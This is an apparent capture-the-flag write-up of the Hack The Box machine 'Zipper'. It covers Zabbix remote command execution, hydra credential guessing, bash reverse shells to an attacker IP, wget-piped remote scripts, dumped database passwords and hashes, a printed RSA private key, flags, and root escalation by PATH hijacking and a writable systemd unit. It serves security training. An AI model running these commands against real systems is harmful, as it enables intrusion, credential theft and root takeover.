# Zipper



## Recon

::: details nmap_scan.log
```log
Open 10.129.1.198:22
Open 10.129.1.198:80
Open 10.129.1.198:10050
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.129.1.198

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqkIIMof/LgaPPxHdtY6gk+J0fIJ617tm65SupFSOq99moo0EB1AmY0+JFBxZCivbaifQnwZMcPjTXrb37XGiU6tooIfCFLQYlB51UhgV220xqRCQFXoVrHJ/bq3L/Me81gLZ/hG/CwTGVBxZ9HYaTE+11stqtnVPqFdQsvOuQbWl9nMtSjNgnLSmmhJV2U935XyoTa+uK2KrbS2ehxspxO8E4VRKWbcv5tmE272JI0GdFlqRlpO13s5QxybI+REKmFULevnCTI8SiGB9rRPnwGJmBLbD7HwrSfltbFMoSkxNk1f9tBfmixLcM5hoiFfFu8O+Lxcuf72ddDKqyUYnB
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNrGBZHK+XXkq147cQCbzGN1kAdel5dyfLLqHh455s3otLr7R+iVRyfnqc5JUjDtUL05ObFwH00j7fgPvxFH228=
|   256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK9TMqlon5J/j6iS1JX4qlKvcBs0p5IH2zttUM5Ctbcs
80/tcp    open  http       syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
10050/tcp open  tcpwrapped syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```
:::

## Zabbix (10050)

> Note: Adding after HTTP feroxbuster try

[Zabbix: Open port 10050 on client necessary?](https://serverfault.com/questions/875451/zabbix-open-port-10050-on-client-necessary)

I couldn't connect to this service, but `/zabbix` is a valid path in HTTP. It's available in these wordlists.

```bash
└─$ grep '^zabbix$' /usr/share/seclists/Discovery/Web-Content -Rain | sort -t : -k 2n | cut -d '/' -f 7-
directory-list-1.0.txt:8503:zabbix
directory-list-lowercase-2.3-medium.txt:23176:zabbix
directory-list-2.3-medium.txt:25173:zabbix
directory-list-lowercase-2.3-big.txt:25322:zabbix
directory-list-lowercase-2.3-small.txt:26936:zabbix
directory-list-2.3-big.txt:27460:zabbix
directory-list-2.3-small.txt:29240:zabbix
dutch/my.txt:29507:zabbix
combined_directories.txt:41920:zabbix
dutch/my_u_without_spaces.txt:127704:zabbix
dutch/my_u.txt:130624:zabbix
dutch/my_with_underscore.txt:130624:zabbix
```

## HTTP (80)

![Writeup.png](/assets/pentest/htb/zipper/Writeup.png)

Dirbusting returned nothing.
```bash
└─$ feroxbuster -u 'http://10.129.1.198/' -w /usr/share/seclists/Discovery/Web-Content/common.txt --dont-filter -C 404
└─$ feroxbuster -u 'http://10.129.1.198/' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-filter -C 404
```

### Zabbix Web

From port 10050 we know it's `zabbix`, trying that path gets us to the application.

![Writeup-1.png](/assets/pentest/htb/zipper/Writeup-1.png)

Default credentials of `Admin:zabbix` doesn't work, but we can sign in as guest.

![Writeup-2.png](/assets/pentest/htb/zipper/Writeup-2.png)

We get the version at the bottom `Zabbix 3.0.21` -> [Zabbix 2.2.x/3.0.x - SQL Injection](https://www.exploit-db.com/exploits/40237) -> Doesn't work.

[Some-PoC-oR-ExP](https://github.com/coffeehb/Some-PoC-oR-ExP/tree/master)/ [Zabbix](https://github.com/coffeehb/Some-PoC-oR-ExP/tree/master/Zabbix) / [zabbixRceExP.py](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Zabbix/zabbixRceExP.py)
[https://web.archive.org/web/20230928055922/https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html](https://web.archive.org/web/20230928055922/https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html)

```bash
└─$ curl -LOs 'https://raw.githubusercontent.com/coffeehb/Some-PoC-oR-ExP/refs/heads/master/Zabbix/zabbixRceExP.py'
```

The script requires authentication, looking around in **Latest data** we have few potential users

![Writeup-3.png](/assets/pentest/htb/zipper/Writeup-3.png)

### User Enumeration

First we can try to bruteforce usernames with usernames as password
```bash
└─$ cat users.txt
Zipper
Zabbix
Zapper
zipper
zabbix
zapper
└─$ hydra -L users.txt -e s 10.129.1.198 http-post-form '/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:is incorrect'
[80][http-post-form] host: 10.129.1.198   login: zapper   password: zapper
```

We get **GUI access disabled**, not incorrect credentials.

![Writeup-4.png](/assets/pentest/htb/zipper/Writeup-4.png)

To get `hostid` => Latest data -> Click Zabbix -> Host Inventory -> URL -> [http://10.129.1.198/zabbix/hostinventories.php?hostid=10105&sid=7bdbf30d799f4bb8](http://10.129.1.198/zabbix/hostinventories.php?hostid=10105&sid=7bdbf30d799f4bb8) -> 10105

### RCE in Docker

```bash
└─$ py2 zabbixRceExP.py
[zabbix_cmd]>>: id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)

[zabbix_cmd]>>: bash -c '/bin/bash -i >& /dev/tcp/10.10.14.113/4444 0>&1'
```

We are inside Docker
```bash
(remote) zabbix@c711b7303a19:/$ cat .dockerenv
```

```bash
(remote) zabbix@c711b7303a19:/etc/zabbix$ cat zabbix_server.conf | grep -vE '#|^$'
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
DebugLevel=0
PidFile=/var/run/zabbix/zabbix_server.pid
DBName=zabbixdb
DBUser=zabbix
DBPassword=f.YMeMd$pTbpY3-449
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
```

#### MySQL

```bash
(remote) zabbix@c711b7303a19:/etc/zabbix$ mysql -u zabbix -p'f.YMeMd$pTbpY3-449' -e 'SHOW DATABASES';
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
| Database           |
+--------------------+
| information_schema |
| zabbixdb           |
+--------------------+
(remote) zabbix@c711b7303a19:/etc/zabbix$ mysql -u zabbix -p'f.YMeMd$pTbpY3-449' zabbixdb -e 'SHOW TABLES';
+----------------------------+
| Tables_in_zabbixdb         |
+----------------------------+
| acknowledges               |
| actions                    |
| alerts                     |
| application_discovery      |
| application_prototype      |
| application_template       |
| applications               |
| auditlog                   |
| auditlog_details           |
| autoreg_host               |
| conditions                 |
| config                     |
| dbversion                  |
| dchecks                    |
| dhosts                     |
| drules                     |
| dservices                  |
| escalations                |
| events                     |
| expressions                |
| functions                  |
| globalmacro                |
| globalvars                 |
| graph_discovery            |
| graph_theme                |
| graphs                     |
| graphs_items               |
| group_discovery            |
| group_prototype            |
| groups                     |
| history                    |
| history_log                |
| history_str                |
| history_text               |
| history_uint               |
| host_discovery             |
| host_inventory             |
| hostmacro                  |
| hosts                      |
| hosts_groups               |
| hosts_templates            |
| housekeeper                |
| httpstep                   |
| httpstepitem               |
| httptest                   |
| httptestitem               |
| icon_map                   |
| icon_mapping               |
| ids                        |
| images                     |
| interface                  |
| interface_discovery        |
| item_application_prototype |
| item_condition             |
| item_discovery             |
| items                      |
| items_applications         |
| maintenances               |
| maintenances_groups        |
| maintenances_hosts         |
| maintenances_windows       |
| mappings                   |
| media                      |
| media_type                 |
| opcommand                  |
| opcommand_grp              |
| opcommand_hst              |
| opconditions               |
| operations                 |
| opgroup                    |
| opinventory                |
| opmessage                  |
| opmessage_grp              |
| opmessage_usr              |
| optemplate                 |
| profiles                   |
| proxy_autoreg_host         |
| proxy_dhistory             |
| proxy_history              |
| regexps                    |
| rights                     |
| screen_user                |
| screen_usrgrp              |
| screens                    |
| screens_items              |
| scripts                    |
| service_alarms             |
| services                   |
| services_links             |
| services_times             |
| sessions                   |
| slides                     |
| slideshow_user             |
| slideshow_usrgrp           |
| slideshows                 |
| sysmap_element_url         |
| sysmap_url                 |
| sysmap_user                |
| sysmap_usrgrp              |
| sysmaps                    |
| sysmaps_elements           |
| sysmaps_link_triggers      |
| sysmaps_links              |
| timeperiods                |
| trends                     |
| trends_uint                |
| trigger_depends            |
| trigger_discovery          |
| triggers                   |
| users                      |
| users_groups               |
| usrgrp                     |
| valuemaps                  |
+----------------------------+
(remote) zabbix@c711b7303a19:/etc/zabbix$ mysql -u zabbix -p'f.YMeMd$pTbpY3-449' zabbixdb -e 'SELECT alias,name,surname,passwd FROM users';
+--------+--------+---------------+----------------------------------+
| alias  | name   | surname       | passwd                           |
+--------+--------+---------------+----------------------------------+
| Admin  | Zabbix | Administrator | 65e730e044402ef2e2f386a18ec03c72 |
| guest  |        |               | d41d8cd98f00b204e9800998ecf8427e |
| zapper | zapper |               | 16a7af0e14037b567d7782c4ef1bdeda |
+--------+--------+---------------+----------------------------------+
```

![Writeup-5.png](/assets/pentest/htb/zipper/Writeup-5.png)

```bash
└─$ echo -n 'f.YMeMd$pTbpY3-449' | md5sum
65e730e044402ef2e2f386a18ec03c72  -
```

### Login as Admin

> Creds: `admin:f.YMeMd$pTbpY3-449`

![Writeup-6.png](/assets/pentest/htb/zipper/Writeup-6.png)

[zabbix-client](https://github.com/winebarrel/zabbix-client)

```bash
└─$ export ZABBIX_URL='http://10.129.1.198/zabbix/api_jsonrpc.php'
└─$ export ZABBIX_USER='admin:f.YMeMd$pTbpY3-449'
└─$ ./zabbix-cli -e apiinfo.version
3.0.21
```

[https://www.zabbix.com/documentation/current/en/manual/api/reference/apiinfo/version](https://www.zabbix.com/documentation/current/en/manual/api/reference/apiinfo/version)
[https://www.zabbix.com/documentation/7.0/en/manual/config/items/itemtypes/zabbix_agent](https://www.zabbix.com/documentation/7.0/en/manual/config/items/itemtypes/zabbix_agent)
[https://www.zabbix.com/documentation/7.0/en/manual/config/items/itemtypes/zabbix_agent#system.run](https://www.zabbix.com/documentation/7.0/en/manual/config/items/itemtypes/zabbix_agent#system.run)

### Zabbix API

So the above program didn't like `sytstem.run[command]` syntax and gave up on it. We can pipe command with `nc`, but exposed port doesn't doesn't seem to work because it returns empty responses.

If we go back to shell again there's another host and it's agent is working properly.
```bash
(remote) zabbix@c711b7303a19:/$ echo 'apiinfo.version' | nc 127.0.0.1 10050
(UNKNOWN) [127.0.0.1] 10050 (zabbix-agent) : Connection refused
(remote) zabbix@c711b7303a19:/$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.17.0.1       0x1         0x2         02:42:3c:63:01:65     *        eth0
(remote) zabbix@c711b7303a19:/$ echo 'apiinfo.version' | nc 172.17.0.1 10050;echo
ZBXD&ZBX_NOTSUPPORTEDUnsupported item key.
(remote) zabbix@c711b7303a19:/$ echo 'system.run[id]' | nc 172.17.0.1 10050;echo
ZBXD2uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
```

## Reverse Shell (zabbix)

The shell keeps dying after 1-2 seconds, we can use `nohup` command to tell process not to die when agent dies.
```bash
echo 'system.run[bash -c "nohup /bin/bash -i >& /dev/tcp/10.10.14.113/4444 0>&1 &"]' | nc 172.17.0.1 10050
---
└─$ listen
Ncat: Connection from 10.129.1.198:52622.
zabbix@zipper:/$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
```


```bash
zabbix@zipper:/var$ curl 10.10.14.113/lp.sh|sh|tee /tmp/lp.log
Command 'curl' not found, but can be installed with:
zabbix@zipper:/var$ wget http://10.10.14.113/lp.sh -O-|sh|tee /tmp/lp.log
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
╔══════════╣ Container related tools present (if any):
/usr/bin/docker
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
root      1675  0.0  0.1 827936  2556 ?        Sl   09:02   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.17.0.2 -container-port 80
╔══════════╣ Hostname, hosts and DNS
zipper
127.0.0.1       localhost
127.0.1.1       zipper.htb      zipper
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/docker
/usr/bin/gcc
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget
╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
0mw-r--r-- 1 zapper zapper 4699 Sep  8  2018 /home/zapper/.bashrc
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/zapper/.bash_history
/home/zapper/utils/zabbix-service
/root/
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group zabbix:
/run/zabbix/zabbix_agentd.pid
/var/log/zabbix-agent/zabbix_agentd.log
╔══════════╣ Unexpected in root
/initrd.img.old
/.bash_history
/backups
/initrd.img
/core
/vmlinuz.old
/vmlinuz
╔══════════╣ Backup files (limited 100)
-rw-rw-r-- 1 zapper zapper 3005 Dec  6 11:30 /backups/zapper_backup-2024-12-06.7z
-rw-rw-r-- 1 messagebus input 330 Dec  6 11:34 /backups/zabbix_scripts_backup-2024-12-06.7z
...
╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES
Fri 2024-12-06 11:48:13 EST  1min 4s left Fri 2024-12-06 11:43:13 EST  3min 55s ago purge-backups.timer          purge-backups.service
```

Password is stored in backup script:
```bash
zabbix@zipper:/home/zapper/utils$ cat backup.sh
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
```

## SSH (22)

Creds: `zappeer:ZippityDoDah`

```bash
zabbix@zipper:/home/zapper/utils$ su - zapper
su: must be run from a terminal
zabbix@zipper:/home/zapper/utils$ script /dev/null -qc /bin/bash
zabbix@zipper:/home/zapper/utils$ su - zapper
Password: ZippityDoDah
...
[252] Packages Need To Be Updated
[>] Backups:
4.0K    /backups/zapper_backup-2024-12-06.7z
4.0K    /backups/zabbix_scripts_backup-2024-12-06.7z

zapper@zipper:~$ id
id
uid=1000(zapper) gid=1000(zapper) groups=1000(zapper),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
zapper@zipper:~$ cat user.txt
```

### User.txt

```bash
zapper@zipper:~$ cat user.txt
57cb9c35016813893f871456c85431da
```

### Get into SSH

So password authentication is disabled on box, but we get the user's keys.

```bash
zapper@zipper:~$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR
l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67
GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+
eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M
2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi
eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz
+docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo
84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4
aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh
UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa
8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP
rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV
UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0
oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY
ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+
zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe
8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac
OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur
7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A
m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K
Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB
MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu
lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk
WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE
Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ=
-----END RSA PRIVATE KEY-----
```

```bash
└─$ vi zapper.id_rsa
└─$ chmod 600 zapper.id_rsa
└─$ ssh zapper@10.129.1.198 -i zapper.id_rsa
```

## Privilege Escalation

```bash
zapper@zipper:~$ sudo -l
Sorry, user zapper may not run sudo on zipper.
```

```bash
zapper@zipper:/tmp$ 7z x /backups/zapper_backup-2024-12-06.7z -o'/tmp/zapper_backup' -p'ZippityDoDah'
zapper@zipper:/tmp$ 7z x /backups/zabbix_scripts_backup-2024-12-06.7z -o'/tmp/zabbix_backup' -p'ZippityDoDah'
```

Backups have same things as in `~/utils` and the service application is SUID binary.

```bash
zapper@zipper:~/utils$ ls -Alh
total 12K
-rwxr-xr-x 1 zapper zapper  194 Sep  8  2018 backup.sh
-rwsr-sr-x 1 root   root   7.4K Sep  8  2018 zabbix-service
zapper@zipper:~/utils$ file *
backup.sh:      Bourne-Again shell script, ASCII text executable
zabbix-service: setuid, setgid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=70745588e3c50ad90b7074ea8f9bf16f5a12e004, not stripped
```

### Path 1

The binary is calling `systemctl`, but with relative path meaning we can hijack this.
```bash
zapper@zipper:~/utils$ strings zabbix-service
...
[^_]
start or stop?:
start
systemctl daemon-reload && systemctl start zabbix-agent
stop
systemctl stop zabbix-agent
[!] ERROR: Unrecognized Option
...
```

```bash
zapper@zipper:~/utils$ nano /tmp/systemctl
zapper@zipper:~/utils$ cat  /tmp/systemctl
#!/bin/bash
install -m4777 /bin/bash /tmp/rootbash
zapper@zipper:~/utils$ chmod +x /tmp/systemctl
zapper@zipper:~/utils$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
zapper@zipper:~/utils$ export PATH="/tmp:$PATH"
zapper@zipper:~/utils$ ls -l /tmp/rootbash
-rwsrwxrwx 1 root root 1235608 Dec  6 12:07 /tmp/rootbash
zapper@zipper:~/utils$ /tmp/rootbash -p
rootbash-4.4# id
uid=1000(zapper) gid=1000(zapper) euid=0(root) groups=1000(zapper),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

### Path 2

In linpeas we saw recent service
```bash
╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES
Fri 2024-12-06 11:48:13 EST  1min 4s left Fri 2024-12-06 11:43:13 EST  3min 55s ago purge-backups.timer          purge-backups.service
```

It's writable by us too.
```bash
zapper@zipper:~/utils$ find / -name purge-backups.service -ls 2>/dev/null
     6568      4 -rw-rw-r--   1 root     zapper        132 Sep  8  2018 /etc/systemd/system/purge-backups.service
zapper@zipper:~/utils$ find / -name purge-backups.timer 2>/dev/null
/etc/systemd/system/zabbix-agent.service.wants/purge-backups.timer
/etc/systemd/system/purge-backups.timer
zapper@zipper:~/utils$ cat /etc/systemd/system/purge-backups.timer
[Unit]
Description=Purge Backups (Timer)
After=zabbix-agent.service
Requires=zabbix-agent.service
BindsTo=zabbix-agent.service

[Timer]
OnBootSec=15s
OnUnitActiveSec=5m
Unit=purge-backups.service

[Install]
WantedBy=zabbix-agent.service

zapper@zipper:~/utils$ nano /etc/systemd/system/purge-backups.service
zapper@zipper:~/utils$ cat /etc/systemd/system/purge-backups.service
[Unit]
Description=Purge Backups (Script)
[Service]
# ExecStart=/root/scripts/purge-backups.sh
ExecStart=/tmp/letmein.sh
[Install]
WantedBy=purge-backups.timer

zapper@zipper:~/utils$ nano /tmp/letmein.sh
zapper@zipper:~/utils$ chmod +x /tmp/letmein.sh
zapper@zipper:~/utils$ cat /tmp/letmein.sh
#!/bin/bash
install -m4777 /bin/bash /tmp/rootbash2
zapper@zipper:~/utils$ export PATH="/tmp:$PATH"

zapper@zipper:~/utils$ ./zabbix-service
start or stop?: stop
zapper@zipper:~/utils$ ./zabbix-service
start or stop?: start
zapper@zipper:~/utils$ ls -alh /tmp/rootbash2
-rwsrwxrwx 1 root root 1.2M Dec  6 12:24 /tmp/rootbash2
```

### Root.txt

```bash
rootbash2-4.4# cat /root/root.txt
8202c10667839e4a673c6a0a277d6b59
```